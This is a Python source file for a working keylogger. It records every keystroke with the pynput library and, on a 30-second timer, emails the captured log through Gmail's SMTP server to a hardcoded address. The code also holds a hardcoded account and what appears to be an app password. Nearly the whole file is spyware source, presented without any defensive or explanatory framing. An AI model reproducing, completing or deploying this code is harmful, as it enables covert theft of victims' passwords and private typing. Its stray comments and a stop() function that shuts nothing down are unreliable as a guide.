#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:

    def __init__(self):
        
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):

        try:
            self.log += str(key.char)
        except AttributeError:
            if key == key.space:
                self.log+=" "
    #        elif key == key.backspace:
    #            self.log=self.log[:-1]
            else:
                self.log+= " " + str(key).replace("Key.", "") + " "
        
#        print(self.log)

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
           smtp_server.login(sender, password)
           smtp_server.sendmail(sender, recipients, msg.as_string())


    def report(self):
        email_body = "[+] Keylogger initiated successfuly" if self.is_first_run else self.log
        self.send_email("KeyLogger Report", email_body, "ton0testing2@gmail.com", ["ton0testing2@gmail.com"],"gmil yovb npal xhhx")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False
        
        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report) #every 5 seconds calls recursively the report function
            self.timer.start()


    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

def bootup():
    Keylogger().start()

def stop():
    Keylogger().shutdown()